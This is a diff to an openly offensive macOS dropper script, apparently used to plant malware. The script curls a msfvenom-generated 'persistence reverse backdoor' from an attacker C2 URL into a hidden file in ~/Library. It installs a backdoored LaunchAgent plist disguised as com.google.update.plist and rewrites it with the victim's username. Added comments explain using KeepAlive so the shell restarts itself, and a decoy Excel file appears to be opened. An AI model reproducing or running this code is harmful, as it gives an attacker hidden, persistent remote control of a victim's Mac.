@@ -20,7 +20,7 @@ PAYLOAD=".${PAYLOAD}"
 # curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
 # or
 # Download from https
-# This payload is our persistence reverse backdoor in mach-o format!!!
+# This payload is our persistence reverse backdoor in mach-o format generated with msfvenom
 curl -s -k $URL -o ~/Library/$PAYLOAD
 
 # Want to be sure that's my payload is executable
@@ -33,15 +33,17 @@ sleep 2
 
 # Persistence as LaunchAgents. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
-# or just reboot.
+# or just reboot. Instead set KeepAlive directive in your plist file to makes an unbreakable shell
+# that persist also if you kill it from metasploit or if app crash it restarts itself
 #
-# Download and write backdoored plist file
+# Download and write backdoored plist file in right directory
 curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist
 
-# We need to replace 'replace' string on our ,plist file with correct username of our victim
-# Remember that using sed on OSX will use BSD mode. So u need a backup file that will remove in second istance
+# We need to replace the 'word' string in your plist file with correct username of our victim.
+# In this case my original hosted plist file string contains the 'replaceme' string
+# Remember that using sed on OSX will use BSD mode. So u need a backup file that we'll remove
 USERNAME=$(whoami)
-sed -i .bak "s/replace/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
+sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
 rm ~/Library/LaunchAgents/com.google.update.plist.bak
 
 # Download and open a real file excel
